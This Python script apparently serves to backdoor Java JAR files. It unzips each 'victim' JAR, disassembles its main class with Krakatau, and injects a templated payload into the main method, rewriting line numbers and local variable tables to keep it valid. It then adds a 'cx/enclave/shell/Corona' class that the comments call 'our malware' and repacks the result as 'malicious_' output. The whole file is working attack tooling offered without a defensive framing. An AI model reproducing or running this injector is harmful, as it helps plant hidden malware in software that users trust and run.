from zipfile import ZipFile

import pathlib
import os
import subprocess
import shutil
import pathlib
import re

FOLDER_VICTIM = "./victim"
FOLDER_TMP = "./tmp"
FOLDER_OUTPUT = "./output"
FOLDER_PAYLOAD = "./payloads"

JDK_HOME = "/home/nigel2x4/.jdks/openjdk-15/"
# def get_byte_file_from_dir(directory):
    
LINEREGEX = r"(L\d*[^a-zA-Z])"


def get_contents_from_main_class(main_class_location):
    krakatau_command = "util/Krakatau/disassemble.py"
    os.system("{} -out . {}.class".format(krakatau_command, os.path.join(FOLDER_TMP, main_class_location)))
    
    byte_file = None
    krakatau_dir = os.listdir(".")[0]
    for path, subdirs, files in os.walk(os.path.join(".", krakatau_dir)):
        for name in files:
            if name.endswith(".j"):
                byte_file = os.path.join(path, name)

    retval = None
    with open(byte_file, 'r') as bytecode_main_class_fp:
        retval = bytecode_main_class_fp.read()
    shutil.rmtree(os.path.join('.', krakatau_dir))
    return retval


# we need to calculate the max amount of locals currently in the old main method
# theen we need to put this number into the aload_{}, astore_{} fields. Refer to this in localvartable.
# TODO: add payload method
def get_payload(local_variable_number):
    with open("./template_payload", "r") as payload_fp:
        return payload_fp.read().format(
            local_variable_number=local_variable_number - 1,
            payload_path="cx/enclave/shell/Corona" # TODO: make not hardcoded
        )


def get_variable_table(local_variable_number, new_max_linenumber):
    with open("./template_lvartable", "r") as lvar_fp:
        return lvar_fp.read().format(
            local_variable_number=local_variable_number-1,
            random="abbacus",
            max_linenum=new_max_linenumber,
            payload_path="cx/enclave/shell/Corona" # TODO: Make not hardcoded
        )


def get_max_linenumber(code):
    number = 0
    for line in code.split("\n"):
        val = line.split(": ")[0]
        if val.startswith("L"):
            number = int(val[1:])
    return number


def modify_mainclass_bytecode(java_bytecode):
    # print(java_bytecode)
    index_start = java_bytecode.find(".method public static main : ([Ljava/lang/String;)V")
    index_end = 0
    index_method_param = java_bytecode[index_start:].find(".end methodparameters") 
    if index_method_param > 0:
        index_end = index_method_param + len(".end methodparameters") + index_start + 14
    else:
        index_end = java_bytecode[index_start:].find(".end method")  + len(".end method") + index_start

    old_main_method = java_bytecode[index_start:index_end]

    injection_point = old_main_method.find("L0:")
    linetable_start_point = old_main_method.find(".linenumbertable")

    new_main_method = old_main_method[:injection_point]
    # change locals number

    new_variable_number = int(re.search(r"locals (.*\d)", old_main_method).groups(0)[0]) + 1
    new_main_method = new_main_method.replace(
                        "locals {}".format(int(new_variable_number)-1), 
                        "{} {}".format("locals", new_variable_number)
                    )

    payload = get_payload(new_variable_number)

    # fix line numbers
    new_start_number = get_max_linenumber(payload) + 3
    new_max_linenumber = get_max_linenumber(old_main_method) + new_start_number

    

    # changing the line numbers of the old main function
    changed_old_code = old_main_method[injection_point:old_main_method.find(".linenumbertable")]
    new_code = ""
    for group in re.findall(r"(L\d*[^a-zA-Z]):", changed_old_code, re.MULTILINE):
        for line in changed_old_code.split("\n"):
            if group in line:
                new_code = new_code + line.replace(group, "L{}".format(int(group[1:])+new_start_number)) + os.linesep
                break

    # fix variable table to include our payload
    variable_start_poitn = old_main_method.find(".localvariabletable")  + len(".localvariabletable") + 2
    vartable_end_point = old_main_method.find(".end localvariabletable")

    # variable table fix...
    payload_variable_table = get_variable_table(new_variable_number, new_max_linenumber)
    old_var_table = old_main_method[variable_start_poitn:vartable_end_point]
    first = True

    for group in reversed(re.findall(r"(L\d*[^a-zA-Z]) ", old_var_table.split(os.linesep)[1])):
        old_var_table = old_var_table.replace(
            "L{}".format(group[1:]), 
            "L{}".format(int(group[1:])+new_start_number))

    localvartable = os.linesep + ".localvariabletable" + os.linesep + old_var_table + payload_variable_table + os.linesep + ".end localvariabletable"
    
    linenumtable = old_main_method[old_main_method.find(".linenumbertable"):old_main_method.find(".end linenumbertable") + len(".end linenumbertable")]
    for group in re.findall(r"(L\d*)", linenumtable, re.MULTILINE):
        linenumtable = linenumtable.replace(group, "L0")
        # for line in 

                # new_code = new_code + line.replace(group, "L{}".format(int(group[1:])+new_start_number)) + os.linesep
                # break

    # old_main_method[old_main_method.find(".linenumbertable"):old_main_method.find(".end linenumbertable") + len(".end linenumbertable")]
    # end result...
    method_ending = """
    .end code 
    .exceptions java/lang/Exception 
    .methodparameters 
        args 
    .end methodparameters 
.end method 
    """
    main_method = new_main_method + payload + new_code + linenumtable + localvartable + method_ending

    payload = java_bytecode[:index_start] + main_method + java_bytecode[index_end:]

    return payload


def start():

    for victim_name in os.listdir(FOLDER_VICTIM):
        with ZipFile(os.path.join(FOLDER_VICTIM, victim_name), "r") as zipfp:
            zipfp.extractall(FOLDER_TMP)

        main_class_location = None
        with open(os.path.join(FOLDER_TMP, "META-INF") + "/MANIFEST.MF", "r") as mfp:
            for line in mfp.read().split(os.linesep):
                try:
                    key, value = line.split(": ")
                    if key == "Main-Class": 
                        main_class_location = value
                        break
                except ValueError:
                    continue

        java_bytecode = get_contents_from_main_class(main_class_location.replace('.', os.sep))
        payload = modify_mainclass_bytecode(java_bytecode)

        # we got the payload, we just write it to the .j file 
        with open("test.j",'w') as tfp:
            tfp.write(payload)

        # then assemble the j file using Krakatau
        os.system("util/Krakatau/assemble.py -out . test.j")

        # we can just use the manifest file in our current dir to move it to the correct dir :)
        manifest_dir = main_class_location.replace(".", os.sep)

        shutil.move(main_class_location.replace(".", os.sep) + ".class", "{}.class".format(os.path.join(FOLDER_TMP, manifest_dir)))

        # move our malware to the jar...
        os.makedirs(os.path.join(FOLDER_TMP, "cx", "enclave", "shell"), exist_ok=True)
        shutil.copy("./payloads/Corona.class", os.path.join(FOLDER_TMP, "cx", "enclave", "shell"))
        shutil.rmtree(manifest_dir.split("/")[0])
        # then zip the jar
        # lets use os for now...

        p = subprocess.Popen(["{}bin/jar".format(JDK_HOME), "cmv0f", "META-INF/MANIFEST.MF", "../output/malicious_{}".format(victim_name), "."], cwd="./tmp")
        p.wait()

        # boom. payload. 
        os.remove("test.j")
        shutil.rmtree(FOLDER_TMP)
        os.mkdir(FOLDER_TMP)


if __name__ == "__main__":
    start()
